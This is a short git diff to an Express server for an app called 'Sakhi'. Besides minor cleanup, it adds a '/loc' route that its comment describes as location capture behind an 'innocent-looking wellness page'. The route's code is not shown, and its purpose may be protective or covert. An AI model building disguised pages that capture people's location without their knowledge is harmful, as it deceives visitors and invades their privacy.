@@ -1,4 +1,4 @@
- require('dotenv').config();
+require('dotenv').config();
 const express = require('express');
 const app = express();
 
@@ -9,7 +9,11 @@ app.use(express.json());
 const webhookRoute = require('./routes/webhook');
 app.use('/webhook', webhookRoute);
 
-// Test route
+// Location capture route (innocent-looking wellness page)
+const locationRoute = require('./routes/location');
+app.use('/loc', locationRoute);
+
+// Health check
 app.get('/', (req, res) => {
   res.send('Sakhi is running 🌸');
 });
